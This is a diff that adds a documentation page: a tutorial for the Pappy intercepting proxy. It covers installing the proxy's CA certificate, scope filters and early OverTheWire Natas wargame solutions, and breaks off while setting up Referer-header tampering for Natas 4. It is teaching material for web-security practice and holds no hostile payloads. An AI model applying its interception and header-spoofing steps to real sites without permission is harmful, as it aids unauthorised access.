@@ -1,0 +1,913 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    
+    <title>The Pappy Proxy Tutorial &mdash; Pappy Proxy 0.0.1 documentation</title>
+    
+    <link rel="stylesheet" href="_static/classic.css" type="text/css" />
+    <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
+    
+    <script type="text/javascript">
+      var DOCUMENTATION_OPTIONS = {
+        URL_ROOT:    './',
+        VERSION:     '0.0.1',
+        COLLAPSE_INDEX: false,
+        FILE_SUFFIX: '.html',
+        HAS_SOURCE:  true
+      };
+    </script>
+    <script type="text/javascript" src="_static/jquery.js"></script>
+    <script type="text/javascript" src="_static/underscore.js"></script>
+    <script type="text/javascript" src="_static/doctools.js"></script>
+    <link rel="top" title="Pappy Proxy 0.0.1 documentation" href="index.html" />
+    <link rel="next" title="The Pappy Proxy Tutorial" href="" />
+    <link rel="prev" title="The Pappy Proxy" href="includeme.html" /> 
+  </head>
+  <body role="document">
+    <div class="related" role="navigation" aria-label="related navigation">
+      <h3>Navigation</h3>
+      <ul>
+        <li class="right" style="margin-right: 10px">
+          <a href="genindex.html" title="General Index"
+             accesskey="I">index</a></li>
+        <li class="right" >
+          <a href="py-modindex.html" title="Python Module Index"
+             >modules</a> |</li>
+        <li class="right" >
+          <a href="#" title="The Pappy Proxy Tutorial"
+             accesskey="N">next</a> |</li>
+        <li class="right" >
+          <a href="includeme.html" title="The Pappy Proxy"
+             accesskey="P">previous</a> |</li>
+        <li class="nav-item nav-item-0"><a href="index.html">Pappy Proxy 0.0.1 documentation</a> &raquo;</li> 
+      </ul>
+    </div>  
+
+    <div class="document">
+      <div class="documentwrapper">
+        <div class="bodywrapper">
+          <div class="body" role="main">
+            
+  <div class="section" id="the-pappy-proxy-tutorial">
+<h1>The Pappy Proxy Tutorial<a class="headerlink" href="#the-pappy-proxy-tutorial" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="table-of-contents">
+<h2>Table of Contents<a class="headerlink" href="#table-of-contents" title="Permalink to this headline">¶</a></h2>
+<div class="toctree-wrapper compound">
+<ul class="current">
+<li class="toctree-l1 current"><a class="current reference internal" href="">The Pappy Proxy Tutorial</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#table-of-contents">Table of Contents</a><ul class="simple">
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#getting-set-up">Getting Set Up</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#introduction">Introduction</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#getting-started">Getting Started</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#installing-pappy-s-ca-cert">Installing Pappy&#8217;s CA Cert</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#installing-the-cert-in-firefox">Installing the Cert in Firefox</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#installing-the-cert-in-chrome">Installing the Cert in Chrome</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#installing-the-cert-in-safari">Installing the Cert in Safari</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#installing-the-cert-in-internet-explorer">Installing the Cert in Internet Explorer</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#configuring-your-browser">Configuring Your Browser</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#testing-it-out">Testing it Out</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#the-tutorial">The Tutorial</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#setting-the-scope">Setting the Scope</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#natas-0">Natas 0</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#natas-1">Natas 1</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#natas-2">Natas 2</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#natas-3">Natas 3</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#finding-your-passwords-later-how-to-use-filters">Finding Your Passwords Later (How to Use Filters)</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#filters">Filters</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#finding-passwords">Finding Passwords</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#natas-4">Natas 4</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#natas-5">Natas 5</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#natas-6">Natas 6</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#natas-7">Natas 7</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#natas-8">Natas 8</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#natas-9">Natas 9</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#skip-a-few-natas-15">Skip a few... Natas 15</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#conclusion">Conclusion</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+<div class="section" id="getting-set-up">
+<h2>Getting Set Up<a class="headerlink" href="#getting-set-up" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="introduction">
+<h3>Introduction<a class="headerlink" href="#introduction" title="Permalink to this headline">¶</a></h3>
+<p>This is a quick tutorial to get you started using Pappy like a pro. To do this, we&#8217;ll be going through from <a class="reference external" href="http://overthewire.org/wargames/natas/">Natas</a>. If you haven&#8217;t done it yet and don&#8217;t want it spoiled, I suggest giving it a try with Burp since we&#8217;ll be telling you all the answers right off the bat.</p>
+</div>
+<div class="section" id="getting-started">
+<h3>Getting Started<a class="headerlink" href="#getting-started" title="Permalink to this headline">¶</a></h3>
+<p>The first thing you&#8217;ll need to do is get Pappy installed.</p>
+<p>Install from pypi:</p>
+<div class="highlight-python"><div class="highlight"><pre>$ pip install pappy
+</pre></div>
+</div>
+<p>or install from source:</p>
+<div class="highlight-python"><div class="highlight"><pre>$ git clone https://github.com/roglew/pappy-proxy.git
+$ cd pappy-proxy
+$ pip install .
+</pre></div>
+</div>
+<div class="admonition note">
+<p class="first admonition-title">Note</p>
+<p class="last">Pappy only supports OS X and Linux! Nothing will work on Windows, sorry!</p>
+</div>
+<p>That was easy! Make a project directory anywhere for Natas and fire up Pappy.:</p>
+<div class="highlight-python"><div class="highlight"><pre>$ mkdir natas
+$ cd natas
+Copying default config to ./config.json
+Proxy is listening on port 8000
+itsPappyTime&gt;
+</pre></div>
+</div>
+<p>If you look at what&#8217;s in the file, you&#8217;ll notice that there&#8217;s a <code class="docutils literal"><span class="pre">data.db</span></code> file and a <code class="docutils literal"><span class="pre">config.json</span></code> file.</p>
+<ul class="simple">
+<li><code class="docutils literal"><span class="pre">data.db</span></code> is a SQLite file that stores all the (in-scope) requests that pass through the proxy</li>
+<li><code class="docutils literal"><span class="pre">config.json</span></code> stores settings for the proxy</li>
+</ul>
+<p>You don&#8217;t need to touch either of these right now. Just hop back into Pappy.</p>
+</div>
+<div class="section" id="installing-pappy-s-ca-cert">
+<h3>Installing Pappy&#8217;s CA Cert<a class="headerlink" href="#installing-pappy-s-ca-cert" title="Permalink to this headline">¶</a></h3>
+<p>In order to intercept HTTPS requests, you&#8217;ll need to add a CA cert to your browser. Installing the cert allows Pappy to act like a certificate authority and sign certificates for whatever it wants without your browser complaining.</p>
+<p>To generate certificates, you&#8217;ll use the <code class="docutils literal"><span class="pre">gencerts</span></code> command. This will generate certificates in Pappy&#8217;s directory. By default, all projects will use the certs in this directory, so you should only have to generate/install the certificates once.:</p>
+<div class="highlight-python"><div class="highlight"><pre>itsPappyTime&gt; gencerts
+This will overwrite any existing certs in /home/anonymouse/pappy/pappyproxy/certs. Are you sure?
+(y/N) y
+Generating certs to /home/anonymouse/pappy/pappyproxy/certs
+Generating private key...  Done!
+Generating client cert...  Done!
+itsPappyTime&gt;
+</pre></div>
+</div>
+<p>The directory that the certs get put in may be different for you. Next, you&#8217;ll need to add the generated <code class="docutils literal"><span class="pre">certificate.crt</span></code> file to your browser. This is different for each browser.</p>
+<div class="section" id="installing-the-cert-in-firefox">
+<h4>Installing the Cert in Firefox<a class="headerlink" href="#installing-the-cert-in-firefox" title="Permalink to this headline">¶</a></h4>
+<ol class="arabic simple">
+<li>Open Firefox</li>
+<li>Go to <code class="docutils literal"><span class="pre">Preferences</span> <span class="pre">-&gt;</span> <span class="pre">Advanced</span> <span class="pre">-&gt;</span> <span class="pre">View</span> <span class="pre">Certificates</span> <span class="pre">-&gt;</span> <span class="pre">Authorities</span></code></li>
+<li>Click <code class="docutils literal"><span class="pre">Import</span></code></li>
+<li>Navigate to the directory where the certs were generated and double click <code class="docutils literal"><span class="pre">certificate.crt</span></code></li>
+</ol>
+</div>
+<div class="section" id="installing-the-cert-in-chrome">
+<h4>Installing the Cert in Chrome<a class="headerlink" href="#installing-the-cert-in-chrome" title="Permalink to this headline">¶</a></h4>
+<ol class="arabic simple">
+<li>Open Chrome</li>
+<li>Go to <code class="docutils literal"><span class="pre">Preferences</span> <span class="pre">-&gt;</span> <span class="pre">Show</span> <span class="pre">advanced</span> <span class="pre">settings</span> <span class="pre">-&gt;</span> <span class="pre">HTTPS/SSL</span> <span class="pre">-&gt;</span> <span class="pre">Manage</span> <span class="pre">Certificates</span> <span class="pre">-&gt;</span> <span class="pre">Authorities</span></code></li>
+<li>Click <code class="docutils literal"><span class="pre">Import</span></code></li>
+<li>Navigate to the directory where the certs were generated and double click <code class="docutils literal"><span class="pre">certificate.crt</span></code></li>
+</ol>
+</div>
+<div class="section" id="installing-the-cert-in-safari">
+<h4>Installing the Cert in Safari<a class="headerlink" href="#installing-the-cert-in-safari" title="Permalink to this headline">¶</a></h4>
+<ol class="arabic simple">
+<li>Use Finder to navigate to the directory where the certs were generated</li>
+<li>Double click the cert and follow the prompts to add it to your system keychain</li>
+</ol>
+</div>
+<div class="section" id="installing-the-cert-in-internet-explorer">
+<h4>Installing the Cert in Internet Explorer<a class="headerlink" href="#installing-the-cert-in-internet-explorer" title="Permalink to this headline">¶</a></h4>
+<ol class="arabic simple">
+<li>No.</li>
+</ol>
+</div>
+</div>
+<div class="section" id="configuring-your-browser">
+<h3>Configuring Your Browser<a class="headerlink" href="#configuring-your-browser" title="Permalink to this headline">¶</a></h3>
+<p>Next, you need to configure your browser to use the proxy. This is generally done using a browser extension. This tutorial won&#8217;t cover how to configure these plugins. Pappy runs on localhost on port 8000. This can be changed in <code class="docutils literal"><span class="pre">config.json</span></code>, but don&#8217;t worry about that right now.</p>
+<div class="admonition note">
+<p class="first admonition-title">Note</p>
+<p class="last">Configure your browser extension to use the proxy server at <strong>loalhost</strong> on <strong>port 8000</strong></p>
+</div>
+<p>Here are some proxy plugins that should work</p>
+<ul class="simple">
+<li>Firefox: <a class="reference external" href="https://addons.mozilla.org/en-us/firefox/addon/foxyproxy-standard/">FoxyProxy</a></li>
+<li>Chrome: <a class="reference external" href="https://chrome.google.com/webstore/detail/proxy-switchysharp/dpplabbmogkhghncfbfdeeokoefdjegm?hl=en">Proxy SwitchySharp</a></li>
+</ul>
+</div>
+<div class="section" id="testing-it-out">
+<h3>Testing it Out<a class="headerlink" href="#testing-it-out" title="Permalink to this headline">¶</a></h3>
+<p>Start up Pappy in Lite mode by running <code class="docutils literal"><span class="pre">pappy</span> <span class="pre">-l</span></code>, enable the proxy in your browser, then navigate to a website:</p>
+<div class="highlight-python"><div class="highlight"><pre>/pappynatas/ $ pappy -l
+Temporary datafile is /tmp/tmp5AQBrH
+Proxy is listening on port 8000
+itsPappyTime&gt; ls
+ID  Verb  Host         Path               S-Code                 Req Len  Rsp Len  Time  Mngl
+8   GET   vitaly.sexy  /favicon.ico       404 Not Found          0        114      0.21  --
+7   GET   vitaly.sexy  /favicon.ico       404 Not Found          0        114      0.22  --
+6   GET   vitaly.sexy  /esr1.jpg          200 OK                 0        17653    0.29  --
+5   GET   vitaly.sexy  /netscape.gif      200 OK                 0        1135     0.22  --
+4   GET   vitaly.sexy  /construction.gif  200 OK                 0        28366    0.26  --
+3   GET   vitaly.sexy  /vitaly2.jpg       200 OK                 0        2034003  1.34  --
+2   GET   vitaly.sexy  /                  200 OK                 0        1201     0.21  --
+1   GET   vitaly.sexy  /                  301 Moved Permanently  0        178      0.27  --
+itsPappyTime&gt; quit
+Deleting temporary datafile
+</pre></div>
+</div>
+<p>Make sure that the request you made appears on the list. When you quit, the temporary data file will be deleted, so no cleanup will be required!</p>
+</div>
+</div>
+<div class="section" id="the-tutorial">
+<h2>The Tutorial<a class="headerlink" href="#the-tutorial" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="setting-the-scope">
+<h3>Setting the Scope<a class="headerlink" href="#setting-the-scope" title="Permalink to this headline">¶</a></h3>
+<p>The first thing we&#8217;ll do is set up Pappy so that it only intercepts requests going to <code class="docutils literal"><span class="pre">*.natas.labs.overthewire.org</span></code>:</p>
+<div class="highlight-python"><div class="highlight"><pre>itsPappyTime&gt; filter host containsr &quot;natas\.labs\.overthewire\.org$&quot;
+itsPappyTime&gt; scope_save
+</pre></div>
+</div>
+<p>What these commands do:</p>
+<ol class="arabic simple">
+<li>Make the current context only include requests whose host ends in <code class="docutils literal"><span class="pre">natas.labs.overthewire.org</span></code>.</li>
+<li>Save the current context as the scope</li>
+</ol>
+<p>The context is basically requests that pass a list of rules. In this case, we have one rule that says that in order for a request to be in the current context, it must pass the regexp <code class="docutils literal"><span class="pre">natas\.labs\.overthewire\.org$</span></code>. When we save the scope, we&#8217;re saying that any request that doesn&#8217;t pass this regexp is out of scope and shouldn&#8217;t be touched.</p>
+<p>If this doesn&#8217;t make sense, don&#8217;t worry, we&#8217;ll come back to this.</p>
+</div>
+<div class="section" id="natas-0">
+<h3>Natas 0<a class="headerlink" href="#natas-0" title="Permalink to this headline">¶</a></h3>
+<p>First, go to <a class="reference external" href="http://natas0.natas.labs.overthewire.org">http://natas0.natas.labs.overthewire.org</a> and log in with the default creds of <code class="docutils literal"><span class="pre">natas0</span></code> / <code class="docutils literal"><span class="pre">natas0</span></code>. You should see a site that says &#8220;You can find the password for the next level on this page&#8221;. You don&#8217;t need Pappy for this one.</p>
+<ol class="arabic simple">
+<li>Right click the page and select &#8220;view source&#8221;</li>
+<li>Read the password for natas1</li>
+<li>Visit <a class="reference external" href="http://natas1.natas.labs.overthewire.org">http://natas1.natas.labs.overthewire.org</a> and log in with the username <code class="docutils literal"><span class="pre">natas1</span></code> and the password you found.</li>
+</ol>
+</div>
+<div class="section" id="natas-1">
+<h3>Natas 1<a class="headerlink" href="#natas-1" title="Permalink to this headline">¶</a></h3>
+<p>Haha! This is the same as natas0, but they got tricky and shut off right-clicking. There&#8217;s still ways to view the source in the browser, but we&#8217;ll use Pappy here. The two commands we&#8217;ll learn here are <code class="docutils literal"><span class="pre">ls</span></code>, <code class="docutils literal"><span class="pre">vfq</span></code>, and <code class="docutils literal"><span class="pre">vfs</span></code>.</p>
+<ul class="simple">
+<li><code class="docutils literal"><span class="pre">ls</span></code> lists the most current requests that are in the current context. You&#8217;ll be using this a lot to get the IDs of requests you want to do things with.</li>
+<li><code class="docutils literal"><span class="pre">vfq</span> <span class="pre">&lt;reqid&gt;</span></code> prints the full request of a request you specify</li>
+<li><code class="docutils literal"><span class="pre">vfs</span> <span class="pre">&lt;reqid&gt;</span></code> prints the full response to a request you specify</li>
+</ul>
+<p>So to solve natas1, we&#8217;ll want to view the full response to our request to the page:</p>
+<div class="highlight-python"><div class="highlight"><pre>itsPappyTime&gt; ls
+ID  Verb  Host                               Path                 S-Code            Req Len  Rsp Len  Time  Mngl
+16  GET   natas1.natas.labs.overthewire.org  /favicon.ico         404 Not Found     0        307      0.27  --
+15  GET   natas1.natas.labs.overthewire.org  /favicon.ico         404 Not Found     0        307      0.27  --
+14  GET   natas1.natas.labs.overthewire.org  /                    200 OK            0        1063     0.27  --
+13  GET   natas1.natas.labs.overthewire.org  /                    401 Unauthorized  0        479      0.27  --
+12  GET   natas0.natas.labs.overthewire.org  /favicon.ico         404 Not Found     0        307      0.27  --
+11  GET   natas0.natas.labs.overthewire.org  /favicon.ico         404 Not Found     0        307      0.26  --
+10  GET   natas.labs.overthewire.org         /img/wechall.gif     200 OK            0        9279     0.28  --
+9   GET   natas.labs.overthewire.org         /js/wechall.js       200 OK            0        1074     0.50  --
+8   GET   natas.labs.overthewire.org         /js/wechall-data.js  200 OK            0        564      0.48  --
+7   GET   natas.labs.overthewire.org         /js/jquery-ui.js     200 OK            0        435844   1.37  --
+6   GET   natas.labs.overthewire.org         /js/jquery-1.9.1.js  200 OK            0        268381   1.20  --
+4   GET   natas.labs.overthewire.org         /css/wechall.css     200 OK            0        677      0.48  --
+5   GET   natas.labs.overthewire.org         /css/jquery-ui.css   200 OK            0        32046    0.49  --
+3   GET   natas.labs.overthewire.org         /css/level.css       200 OK            0        1332     0.48  --
+2   GET   natas0.natas.labs.overthewire.org  /                    200 OK            0        918      0.26  --
+1   GET   natas0.natas.labs.overthewire.org  /                    401 Unauthorized  0        479      0.26  --
+itsPappyTime&gt; vfs 14
+
+HTTP/1.1 200 OK
+Date: Fri, 18 Dec 2015 19:47:21 GMT
+Server: Apache/2.4.7 (Ubuntu)
+Last-Modified: Fri, 14 Nov 2014 10:32:33 GMT
+ETag: &quot;427-507cf258a5240-gzip&quot;
+Accept-Ranges: bytes
+Vary: Accept-Encoding
+Content-Length: 1063
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html
+
+... snip ...
+
+&lt;!--The password for natas2 is [password] --&gt;
+
+... snip ...
+
+itsPappyTime&gt;
+</pre></div>
+</div>
+<p>Yay!</p>
+</div>
+<div class="section" id="natas-2">
+<h3>Natas 2<a class="headerlink" href="#natas-2" title="Permalink to this headline">¶</a></h3>
+<p>When you visit this page, you get a message saying &#8220;There is nothing on this page&#8221;. That is probably a blatant lie. Let&#8217;s see what was in that response.:</p>
+<div class="highlight-python"><div class="highlight"><pre>itsPappyTime&gt; ls
+ID  Verb  Host                               Path                 S-Code            Req Len  Rsp Len  Time  Mngl
+30  GET   natas2.natas.labs.overthewire.org  /favicon.ico         404 Not Found     0        307      0.27  --
+29  GET   natas2.natas.labs.overthewire.org  /favicon.ico         404 Not Found     0        307      0.27  --
+28  GET   natas2.natas.labs.overthewire.org  /files/pixel.png     200 OK            0        303      0.27  --
+27  GET   natas2.natas.labs.overthewire.org  /                    200 OK            0        872      0.27  --
+26  GET   natas2.natas.labs.overthewire.org  /                    401 Unauthorized  0        479      0.27  --
+... snip ...
+itsPappyTime&gt; vfs 27
+
+HTTP/1.1 200 OK
+... snip ...
+&lt;body&gt;
+&lt;h1&gt;natas2&lt;/h1&gt;
+&lt;div id=&quot;content&quot;&gt;
+There is nothing on this page
+&lt;img src=&quot;files/pixel.png&quot;&gt;
+&lt;/div&gt;
+&lt;/body&gt;&lt;/html&gt;
+
+itsPappyTime&gt;
+</pre></div>
+</div>
+<p>So the only suspicious thing is <code class="docutils literal"><span class="pre">&lt;img</span> <span class="pre">src=&quot;files/pixel.png&quot;&gt;</span></code>. I&#8217;ll let you figure out the rest ;)</p>
+</div>
+<div class="section" id="natas-3">
+<h3>Natas 3<a class="headerlink" href="#natas-3" title="Permalink to this headline">¶</a></h3>
+<p>This one doesn&#8217;t require Pappy. Just view the <code class="docutils literal"><span class="pre">robots.txt</span></code> file.</p>
+</div>
+<div class="section" id="finding-your-passwords-later-how-to-use-filters">
+<h3>Finding Your Passwords Later (How to Use Filters)<a class="headerlink" href="#finding-your-passwords-later-how-to-use-filters" title="Permalink to this headline">¶</a></h3>
+<p>This section will explain how to use Pappy&#8217;s filters to find passwords to levels you&#8217;ve already completed. Every in-scope request and response that goes through Pappy is stored in the <code class="docutils literal"><span class="pre">data.db</span></code> file in your project directory. We can use filter commands to search through these requests to find resposes with passwords.</p>
+<div class="section" id="filters">
+<h4>Filters<a class="headerlink" href="#filters" title="Permalink to this headline">¶</a></h4>
+<p>Here are the commands we&#8217;ll learn:</p>
+<ol class="arabic simple">
+<li><code class="docutils literal"><span class="pre">filter</span> <span class="pre">&lt;filter</span> <span class="pre">string&gt;</span></code> / <code class="docutils literal"><span class="pre">f</span> <span class="pre">&lt;filter</span> <span class="pre">string&gt;</span></code> Add a filter that limits which requests are included in the current context</li>
+<li><code class="docutils literal"><span class="pre">fu</span></code> Remove the most recently applied filter</li>
+<li><code class="docutils literal"><span class="pre">sr</span></code> Reset the context so that it matches the scope</li>
+<li><code class="docutils literal"><span class="pre">filter_clear</span></code> Remove all filters from the context, including the filters applied by the scope</li>
+<li><code class="docutils literal"><span class="pre">fls</span></code> Show all currently applied filters</li>
+</ol>
+<p>The most complicated of these is the <code class="docutils literal"><span class="pre">filter</span></code> command since it takes a filter string as an argument. All a filter string is is a string that defines which requests will pass the filter. Anything that doesn&#8217;t pass the filter will be removed from the context. Most filter strings are of the format <code class="docutils literal"><span class="pre">&lt;field&gt;</span> <span class="pre">&lt;comparer&gt;</span> <span class="pre">&lt;value&gt;</span></code>. For example:</p>
+<div class="highlight-python"><div class="highlight"><pre><span class="n">host</span> <span class="ow">is</span> <span class="n">www</span><span class="o">.</span><span class="n">target</span><span class="o">.</span><span class="n">org</span>
+
+<span class="n">field</span> <span class="o">=</span> <span class="s">&quot;host&quot;</span>
+<span class="n">comparer</span> <span class="o">=</span> <span class="s">&quot;is&quot;</span>
+<span class="n">value</span> <span class="o">=</span> <span class="s">&quot;www.target.org&quot;</span>
+</pre></div>
+</div>
+<p>This filter will only match requests whose host is exactly <code class="docutils literal"><span class="pre">www.target.org</span></code>. When defining our scope, we applied a filter using a <code class="docutils literal"><span class="pre">containsr</span></code> comparer. This matches any request where the field matches a regular expression. Here are a few fields and comparers:</p>
+<p>Commonly used fields</p>
+<ul class="simple">
+<li><code class="docutils literal"><span class="pre">all</span></code> The full text of the request and the response</li>
+<li><code class="docutils literal"><span class="pre">host</span></code> The hostname of where the request is sent</li>
+<li><code class="docutils literal"><span class="pre">path</span></code> The target path of the request. ie <code class="docutils literal"><span class="pre">/path/to/page.php</span></code></li>
+<li><code class="docutils literal"><span class="pre">verb</span></code> The HTTP verb. ie <code class="docutils literal"><span class="pre">POST</span></code> or <code class="docutils literal"><span class="pre">GET</span></code> (case sensitive!)</li>
+<li><code class="docutils literal"><span class="pre">body</span></code> The data section (the body) of either the request or the response</li>
+</ul>
+<p>Commonly used comparers</p>
+<ul class="simple">
+<li><code class="docutils literal"><span class="pre">is</span> <span class="pre">&lt;value&gt;</span></code> The field exactly matches the value</li>
+<li><code class="docutils literal"><span class="pre">contains</span> <span class="pre">&lt;value&gt;</span></code> / <code class="docutils literal"><span class="pre">ct</span> <span class="pre">&lt;value&gt;</span></code> The field contains a value</li>
+<li><code class="docutils literal"><span class="pre">containsr</span> <span class="pre">&lt;regexp&gt;</span></code> / <code class="docutils literal"><span class="pre">ctr</span> <span class="pre">&lt;regexp&gt;</span></code> The field matches a regexp. You may want to surround the regexp in quotes since a number of regexp characters are also control characters in the command line</li>
+</ul>
+<p>You can find the rest of the fields and comparers (including some more complex ones) in the actual documentation.</p>
+<p>Once you&#8217;ve applied some filters, <code class="docutils literal"><span class="pre">ls</span></code> will only show items that pass all the applied filters. If you want to return to viewing all in-scope items, use <code class="docutils literal"><span class="pre">sr</span></code>. If you want to remove the last applied filter, use <code class="docutils literal"><span class="pre">fu</span></code>.</p>
+</div>
+<div class="section" id="finding-passwords">
+<h4>Finding Passwords<a class="headerlink" href="#finding-passwords" title="Permalink to this headline">¶</a></h4>
+<p>While we can&#8217;t find all the passwords with one filter, if we remember how we got the password, we can find it pretty quickly</p>
+<p>For natas0 and natas1, the responses had a phrase like &#8220;the password is abc123&#8221;. So we can filter out anything that doesn&#8217;t have the word &#8220;password&#8221; in it.:</p>
+<div class="highlight-python"><div class="highlight"><pre>itsPappyTime&gt; ls
+ID  Verb  Host                               Path               S-Code                 Req Len  Rsp Len  Time  Mngl
+52  GET   natas4.natas.labs.overthewire.org  /favicon.ico       404 Not Found          0        307      0.26  --
+51  GET   natas4.natas.labs.overthewire.org  /favicon.ico       404 Not Found          0        307      0.27  --
+50  GET   natas4.natas.labs.overthewire.org  /                  200 OK                 0        1019     0.27  --
+49  GET   natas4.natas.labs.overthewire.org  /                  401 Unauthorized       0        479      0.26  --
+48  GET   natas3.natas.labs.overthewire.org  /s3cr3t/users.txt  200 OK                 0        40       0.27  --
+46  GET   natas3.natas.labs.overthewire.org  /icons/text.gif    200 OK                 0        229      0.53  --
+47  GET   natas3.natas.labs.overthewire.org  /icons/back.gif    200 OK                 0        216      0.53  --
+45  GET   natas3.natas.labs.overthewire.org  /icons/blank.gif   200 OK                 0        148      0.53  --
+44  GET   natas3.natas.labs.overthewire.org  /s3cr3t/           200 OK                 0        957      0.26  --
+43  GET   natas3.natas.labs.overthewire.org  /s3cr3t            301 Moved Permanently  0        354      0.27  --
+42  GET   natas3.natas.labs.overthewire.org  /robots.txt        200 OK                 0        33       0.29  --
+41  GET   natas3.natas.labs.overthewire.org  /favicon.ico       404 Not Found          0        307      0.26  --
+40  GET   natas3.natas.labs.overthewire.org  /favicon.ico       404 Not Found          0        307      0.28  --
+39  GET   natas3.natas.labs.overthewire.org  /                  200 OK                 0        923      0.26  --
+38  GET   natas3.natas.labs.overthewire.org  /                  401 Unauthorized       0        479      0.28  --
+37  GET   natas2.natas.labs.overthewire.org  /files/users.txt   200 OK                 0        145      0.28  --
+36  GET   natas2.natas.labs.overthewire.org  /icons/text.gif    200 OK                 0        229      0.47  --
+35  GET   natas2.natas.labs.overthewire.org  /icons/image2.gif  200 OK                 0        309      0.47  --
+34  GET   natas2.natas.labs.overthewire.org  /icons/back.gif    200 OK                 0        216      0.47  --
+33  GET   natas2.natas.labs.overthewire.org  /icons/blank.gif   200 OK                 0        148      0.47  --
+32  GET   natas2.natas.labs.overthewire.org  /files/            200 OK                 0        1153     0.26  --
+31  GET   natas2.natas.labs.overthewire.org  /files             301 Moved Permanently  0        353      0.27  --
+30  GET   natas2.natas.labs.overthewire.org  /favicon.ico       404 Not Found          0        307      0.27  --
+29  GET   natas2.natas.labs.overthewire.org  /favicon.ico       404 Not Found          0        307      0.27  --
+28  GET   natas2.natas.labs.overthewire.org  /files/pixel.png   200 OK                 0        303      0.27  --
+itsPappyTime&gt; f body ct password
+itsPappyTime&gt; ls
+ID  Verb  Host                               Path                 S-Code            Req Len  Rsp Len  Time  Mngl
+49  GET   natas4.natas.labs.overthewire.org  /                    401 Unauthorized  0        479      0.26  --
+38  GET   natas3.natas.labs.overthewire.org  /                    401 Unauthorized  0        479      0.28  --
+37  GET   natas2.natas.labs.overthewire.org  /files/users.txt     200 OK            0        145      0.28  --
+26  GET   natas2.natas.labs.overthewire.org  /                    401 Unauthorized  0        479      0.27  --
+20  GET   natas.labs.overthewire.org         /js/wechall.js       200 OK            0        1074     0.47  --
+24  GET   natas.labs.overthewire.org         /js/jquery-1.9.1.js  200 OK            0        268381   1.20  --
+17  GET   natas1.natas.labs.overthewire.org  /                    200 OK            0        1063     0.30  --
+14  GET   natas1.natas.labs.overthewire.org  /                    200 OK            0        1063     0.27  --
+13  GET   natas1.natas.labs.overthewire.org  /                    401 Unauthorized  0        479      0.27  --
+9   GET   natas.labs.overthewire.org         /js/wechall.js       200 OK            0        1074     0.50  --
+6   GET   natas.labs.overthewire.org         /js/jquery-1.9.1.js  200 OK            0        268381   1.20  --
+2   GET   natas0.natas.labs.overthewire.org  /                    200 OK            0        918      0.26  --
+1   GET   natas0.natas.labs.overthewire.org  /                    401 Unauthorized  0        479      0.26  --
+itsPappyTime&gt;
+</pre></div>
+</div>
+<p>It looks like requests 2 and 14 are the ones we&#8217;re looking for (we know the password is on the page and those are the requests to / that have a 200 OK response). Use <code class="docutils literal"><span class="pre">vfs</span></code> to look at the response and you&#8217;ll get the passwords again! It looks like we also found the password from natas2 (the request to /s3cr3t/users.txt).</p>
+<p>Anyways, back to Natas!</p>
+</div>
+</div>
+<div class="section" id="natas-4">
+<h3>Natas 4<a class="headerlink" href="#natas-4" title="Permalink to this headline">¶</a></h3>
+<p>When we visit this page, we get an error saying that they will only display the password if we visit from <code class="docutils literal"><span class="pre">http://natas5.natas.labs.overthewire.org/</span></code>. How does a website track where you came from? The Referer header! Where&#8217;s that defined? In a header! Do we control the headers? Yes! So all we have to do is set the Referer header to be the correct URL and we&#8217;re golden.</p>
+<p>To do this, we&#8217;ll be using Pappy&#8217;s interceptor. The interceptor lets you stop a request from the browser, edit it, then send it to the server. These are the commands we&#8217;re going to learn:</p>
+<ul class="simple">
+<li><code class="docutils literal"><span class="pre">ic</span> <span class="pre">&lt;req|rsp&gt;+</span></code> Begin interception mode. Intercepts requests and/or responses as decided by the arguments given in the command. <code class="docutils literal"><span class="pre">ic</span> <span class="pre">req</span></code> will only intercept requests, <code class="docutils literal"><span class="pre">ic</span> <span class="pre">rsp</span></code> will only intercept responses, and <code class="docutils literal"><span class="pre">ic</span> <span class="pre">req</span> <span class="pre">rsp</span></code> will intercept both.</li>
+</ul>
+<p>In this case, we only want to intercept requests, so we&#8217;ll run <code class="docutils literal"><span class="pre">ic</span> <span class="pre">req</span></code>:</p>
+<div class="highlight-python"><div class="highlight"><pre>itsPappyTime&gt; ic req
+</pre></div>
+</div>
+<p>And we&#8217;ll get a screen that says something like:</p>
+<div class="highlight-python"><div class="highlight"><pre>Currently intercepting: Requests
+0 item(s) in queue.
+Press &#39;n&#39; to edit the next item or &#39;q&#39; to quit interceptor.
+</pre></div>
+</div>
